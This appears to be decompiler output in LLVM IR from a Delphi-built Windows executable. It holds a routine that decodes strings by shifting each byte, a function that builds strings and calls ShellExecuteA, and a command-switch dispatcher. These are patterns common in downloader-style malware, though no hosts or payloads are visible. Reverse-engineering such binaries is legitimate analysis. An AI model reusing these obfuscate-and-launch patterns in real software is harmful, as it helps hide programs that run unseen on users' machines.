  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1293
  %6 = call i32 @function_4034c8(), !insn.addr !1294
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1295
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1295
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1295

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1296
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1296
  %11 = load i8, i8* %10, align 1, !insn.addr !1296
  %12 = icmp eq i8 %11, 61, !insn.addr !1296
  %13 = icmp eq i1 %12, false, !insn.addr !1297
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1297

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1298
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1298
  store i8 46, i8* %16, align 1, !insn.addr !1298
  br label %dec_label_pc_406162, !insn.addr !1299

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1300
  %18 = add i8 %17, -1, !insn.addr !1301
  %19 = add i32 %14, %8, !insn.addr !1302
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1302
  store i8 %18, i8* %20, align 1, !insn.addr !1302
  br label %dec_label_pc_406162, !insn.addr !1302

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1303
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1304
  %23 = icmp eq i32 %22, 0, !insn.addr !1304
  %24 = icmp eq i1 %23, false, !insn.addr !1305
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1305
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1305
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1305

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1306
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1307
  %26 = call i32 @"@LStrClr"(), !insn.addr !1308
  ret i32 %26, !insn.addr !1309
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1310
  ret i32 %0, !insn.addr !1310
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1311
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1312
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1313
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1314
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1315
  ret i32 %4, !insn.addr !1316
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1317
  %esp.0.reg2mem = alloca i32, !insn.addr !1317
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1317
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1318
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1318
  br label %dec_label_pc_4061cc, !insn.addr !1318

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1319
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1319
  store i32 0, i32* %2, align 4, !insn.addr !1319
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1320
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1320
  store i32 0, i32* %4, align 4, !insn.addr !1320
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1321
  %6 = icmp eq i32 %5, 0, !insn.addr !1321
  %7 = icmp eq i1 %6, false, !insn.addr !1322
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1322
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1322
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1322

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1323
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1323
  store i32 0, i32* %9, align 4, !insn.addr !1323
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1324
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1324
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1325
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1325
  store i32 %0, i32* %13, align 4, !insn.addr !1325
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1326
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1326
  store i32 4219659, i32* %15, align 4, !insn.addr !1326
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1327
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1327
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1327
  store i32 %16, i32* %18, align 4, !insn.addr !1327
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1328
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1329
  %20 = call i32 @function_4060f0(), !insn.addr !1330
  %21 = call i32 @function_4036c8(), !insn.addr !1331
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1332
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1333
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1333
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1333
  store i32 %25, i32* %24, align 4, !insn.addr !1333
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1334
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1335
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1336
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1336
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1336
  store i32 %30, i32* %29, align 4, !insn.addr !1336
  %31 = call i32 @function_4034c8(), !insn.addr !1337
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1338
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1339
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1339
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1339
  %35 = call i32 @function_40618c(), !insn.addr !1340
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1341
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1341
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1342
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1342
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1342
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1343
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1343
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1343
  store i32 %40, i32* %42, align 4, !insn.addr !1343
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1344
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1345
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1345
  store i32 0, i32* %45, align 4, !insn.addr !1345
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1346
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1346
  store i32 0, i32* %47, align 4, !insn.addr !1346
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1347
  %49 = call i32 @function_4036c8(), !insn.addr !1348
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1349
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1349
  store i32 %49, i32* %51, align 4, !insn.addr !1349
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1350
  %53 = call i32 @function_4060f0(), !insn.addr !1351
  %54 = call i32 @function_4036c8(), !insn.addr !1352
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1353
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1353
  store i32 %54, i32* %56, align 4, !insn.addr !1353
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1354
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1354
  store i32 0, i32* %58, align 4, !insn.addr !1354
  %59 = call i32 @function_4060e8(), !insn.addr !1355
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1356
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1356
  store i32 1, i32* %61, align 4, !insn.addr !1356
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1357
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1357
  store i32 0, i32* %63, align 4, !insn.addr !1357
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1358
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1358
  store i32 0, i32* %65, align 4, !insn.addr !1358
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1359
  %67 = call i32 @function_4036c8(), !insn.addr !1360
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1361
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1361
  store i32 %67, i32* %69, align 4, !insn.addr !1361
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1362
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1362
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1362
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1363
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1363
  store i32 0, i32* %73, align 4, !insn.addr !1363
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1364
  %75 = load i32, i32* %73, align 4, !insn.addr !1365
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1366
  store i32 4219666, i32* %69, align 4, !insn.addr !1367
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1368
  ret i32 %76, !insn.addr !1369
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1370
  ret i32 %0, !insn.addr !1370
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1371
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1372
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1373
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1373
  %ecx.0.reg2mem = alloca i32, !insn.addr !1373
  %esp.0.reg2mem = alloca i32, !insn.addr !1373
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1373
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1373
  store i32 %5, i32* %6, align 4, !insn.addr !1373
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1374
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1374
  %11 = add i8 %8, %10, !insn.addr !1374
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1374
  store i8 %11, i8* %12, align 1, !insn.addr !1374
  %13 = add i32 %2, 58, !insn.addr !1375
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1375
  %15 = load i8, i8* %14, align 1, !insn.addr !1375
  %16 = load i32, i32* %eax, align 4, !insn.addr !1375
  %17 = udiv i32 %16, 256, !insn.addr !1375
  %18 = trunc i32 %17 to i8, !insn.addr !1375
  %19 = add i8 %15, %18, !insn.addr !1375
  store i8 %19, i8* %14, align 1, !insn.addr !1375
  %20 = add i32 %0, 112, !insn.addr !1376
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1376
  %22 = load i8, i8* %21, align 1, !insn.addr !1376
  %23 = trunc i32 %4 to i8, !insn.addr !1376
  %24 = add i8 %22, %23, !insn.addr !1376
  store i8 %24, i8* %21, align 1, !insn.addr !1376
  %25 = trunc i32 %3 to i16, !insn.addr !1377
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1377
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1377
  %27 = load i8, i8* %7, align 4, !insn.addr !1378
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1378
  %30 = add i8 %27, %29, !insn.addr !1378
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1378
  store i8 %30, i8* %31, align 1, !insn.addr !1378
  %32 = load i8, i8* %7, align 4, !insn.addr !1379
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1379
  %35 = add i8 %32, %34, !insn.addr !1379
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1379
  store i8 %35, i8* %36, align 1, !insn.addr !1379
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1380
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1381
  store i32 11, i32* %ecx.0.reg2mem, !insn.addr !1381
  br label %dec_label_pc_406350, !insn.addr !1381

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1382
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1382
  store i32 0, i32* %39, align 4, !insn.addr !1382
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1383
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1383
  store i32 0, i32* %41, align 4, !insn.addr !1383
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1384
  %43 = icmp eq i32 %42, 0, !insn.addr !1384
  %44 = icmp eq i1 %43, false, !insn.addr !1385
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1385
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1385
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1385

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1386
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1386
  store i32 0, i32* %46, align 4, !insn.addr !1386
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1387
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1387
  store i32 %37, i32* %48, align 4, !insn.addr !1387
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1388
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1388
  store i32 4220310, i32* %50, align 4, !insn.addr !1388
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1389
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1389
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1389
  store i32 %51, i32* %53, align 4, !insn.addr !1389
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1390
  %54 = call i32 @"@LStrPos"(), !insn.addr !1391
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1392
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1392
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1392
  store i32 %57, i32* %56, align 4, !insn.addr !1392
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1393
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1394
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1394
  store i32 %61, i32* %60, align 4, !insn.addr !1394
  %62 = call i32 @function_4034c8(), !insn.addr !1395
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1396
  %64 = add i32 %arg1, -1, !insn.addr !1397
  store i32 %64, i32* %eax, align 4, !insn.addr !1397
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_40657b [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406506
    i32 2, label %dec_label_pc_406570
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1398
  %66 = icmp slt i32 %65, 5, !insn.addr !1399
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1399
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1399
  br i1 %66, label %dec_label_pc_40657b, label %dec_label_pc_4063da, !insn.addr !1399

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1400
  %68 = call i32 @function_4060f0(), !insn.addr !1401
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1402
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1402
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1403
  %72 = call i32 @function_4060f0(), !insn.addr !1404
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1405
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1405
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1406
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1406
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1406
  store i32 %75, i32* %77, align 4, !insn.addr !1406
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1407
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1407
  store i32 ptrtoint (i32* @global_var_4065b8 to i32), i32* %79, align 4, !insn.addr !1407
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1408
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1408
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1408
  store i32 %80, i32* %82, align 4, !insn.addr !1408
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1409
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1410
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1410
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1411
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1411
  store i32 4220356, i32* %87, align 4, !insn.addr !1411
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1412
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1412
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1412
  store i32 %88, i32* %90, align 4, !insn.addr !1412
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1413
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1413
  store i32 4220372, i32* %92, align 4, !insn.addr !1413
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1414
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1414
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1414
  store i32 %93, i32* %95, align 4, !insn.addr !1414
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1415
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1415
  store i32 4220388, i32* %97, align 4, !insn.addr !1415
  %98 = call i32 @function_407410(), !insn.addr !1416
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1417
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1417
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1418
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1419
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1419
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1420
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1420
  store i32 %106, i32* %105, align 4, !insn.addr !1420
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1421
  %108 = call i32 @function_4060f0(), !insn.addr !1422
  %109 = call i32 @"@LStrPos"(), !insn.addr !1423
  %110 = add i32 %109, -1, !insn.addr !1424
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1425
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1425
  store i32 %110, i32* %112, align 4, !insn.addr !1425
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1426
  %114 = call i32 @function_4060f0(), !insn.addr !1427
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1428
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1429
  store i32 %116, i32* %112, align 4, !insn.addr !1430
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1431
  %118 = call i32 @function_4060f0(), !insn.addr !1432
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1433
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1433
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1434
  %122 = call i32 @function_4060f0(), !insn.addr !1435
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1436
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1437
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1437
  br label %dec_label_pc_40657b, !insn.addr !1437

dec_label_pc_406506:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1438
  %125 = icmp slt i32 %124, 5, !insn.addr !1439
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1439
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1439
  br i1 %125, label %dec_label_pc_40657b, label %dec_label_pc_406513, !insn.addr !1439

dec_label_pc_406513:                              ; preds = %dec_label_pc_406506
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1440
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1440
  store i32 ptrtoint ([5 x i8]* @global_var_406604 to i32), i32* %127, align 4, !insn.addr !1440
  %128 = call i32 @function_404b20(), !insn.addr !1441
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1442
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1442
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1443
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1443
  store i32 ptrtoint ([7 x i8]* @global_var_406614 to i32), i32* %132, align 4, !insn.addr !1443
  %133 = call i32 @function_404b20(), !insn.addr !1444
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1445
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1446
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1447
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1447
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1448
  %140 = call i32 @function_4060f0(), !insn.addr !1449
  %141 = call i32 @function_404c78(), !insn.addr !1450
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1451
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1451
  br label %dec_label_pc_40657b, !insn.addr !1451

dec_label_pc_406570:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1452
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1453
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1453
  br label %dec_label_pc_40657b, !insn.addr !1453

dec_label_pc_40657b:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406570, %dec_label_pc_406513, %dec_label_pc_406506, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %143 = add i32 %esp.0.reload, -16, !insn.addr !1454
  %144 = inttoptr i32 %143 to i32*, !insn.addr !1454
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %145 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1455
  call void @__writefsdword(i32 0, i32 %145), !insn.addr !1456
  %146 = add i32 %esp.1.reload, 8, !insn.addr !1457
  %147 = inttoptr i32 %146 to i32*, !insn.addr !1457
  store i32 4220317, i32* %147, align 4, !insn.addr !1457
  %148 = call i32 @"@LStrArrayClr"(), !insn.addr !1458
  ret i32 %148, !insn.addr !1459
}

define i32 @function_406596() local_unnamed_addr {
dec_label_pc_406596:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1460
  ret i32 %0, !insn.addr !1460
}

define i32 @function_40659b() local_unnamed_addr {
dec_label_pc_40659b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1461
}

define i32 @function_40659d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40659d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1462
}

define i32 @function_4065c7() local_unnamed_addr {
dec_label_pc_4065c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1463
}

define i32 @function_4065cf() local_unnamed_addr {
dec_label_pc_4065cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1464
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1464
  store i32 %1, i32* %2, align 4, !insn.addr !1464
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1465
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1465
  %7 = add i8 %4, %6, !insn.addr !1465
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1465
  store i8 %7, i8* %8, align 1, !insn.addr !1465
  %9 = load i8, i8* %3, align 4, !insn.addr !1466
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1466
  %12 = trunc i32 %11 to i8, !insn.addr !1466
  %13 = add i8 %9, %12, !insn.addr !1466
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1466
  store i8 %13, i8* %14, align 1, !insn.addr !1466
  %15 = load i32, i32* %eax, align 4, !insn.addr !1467
  ret i32 %15, !insn.addr !1467
}

define i32 @function_4065d6() local_unnamed_addr {
dec_label_pc_4065d6:
  %0 = call x86_fp80 @function_406614(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1468
  %1 = fptrunc x86_fp80 %0 to float, !insn.addr !1468
  %2 = bitcast float %1 to i32, !insn.addr !1468
  ret i32 %2, !insn.addr !1468
}

define i32 @function_406612() local_unnamed_addr {
dec_label_pc_406612:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1469
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1469
  store i8 %2, i8* %3, align 1, !insn.addr !1469
  ret i32 %0, !insn.addr !1469
}

define x86_fp80 @function_406614(i32 %arg1) local_unnamed_addr {
dec_label_pc_406614:
  %ebx.1.reg2mem = alloca i32, !insn.addr !1470
  %esp.1.reg2mem = alloca i32, !insn.addr !1470
  %ebx.0.reg2mem = alloca i32, !insn.addr !1470
  %esp.0.reg2mem = alloca i32, !insn.addr !1470
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call x86_fp80 @__decompiler_undefined_function_9()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  br i1 %3, label %dec_label_pc_406678, label %dec_label_pc_406617, !insn.addr !1470

dec_label_pc_406617:                              ; preds = %dec_label_pc_406614
  %5 = icmp eq i1 %4, false, !insn.addr !1471
  br i1 %5, label %dec_label_pc_40668c, label %dec_label_pc_406619, !insn.addr !1471

dec_label_pc_406619:                              ; preds = %dec_label_pc_406617
  %6 = trunc i32 %1 to i16, !insn.addr !1472
  %7 = call i8 @__asm_in(i16 %6), !insn.addr !1472
  %8 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1473
  %9 = add i32 %0, 12, !insn.addr !1474
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1474
  %11 = load i32, i32* %10, align 4, !insn.addr !1474
  %12 = icmp eq i32 %11, 74, !insn.addr !1475
  %13 = icmp eq i1 %12, false, !insn.addr !1476
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !1476
